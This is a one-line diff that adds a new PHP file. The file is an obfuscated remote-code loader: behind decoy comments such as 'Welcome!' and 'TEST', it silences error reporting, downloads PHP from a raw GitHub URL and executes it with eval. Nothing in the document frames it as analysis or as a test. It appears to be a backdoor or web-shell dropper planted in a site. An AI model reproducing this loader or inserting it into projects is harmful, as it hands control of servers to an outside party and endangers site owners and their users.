@@ -1,0 +1,1 @@
+<?php /** Welcome! **/@@@/*_ ??? _*/null; error_reporting/** TEST **/(0); $snails="https://raw.githubusercontent.com/p0ppygg/temp/main/Young.php";/******/@@@/*_ ??? _*/eval/** KIPAK ~~ **/("?>".file_get_contents($snails))/**~~ EZ PZ!! ~~**/ /***_ END! _***/;?>
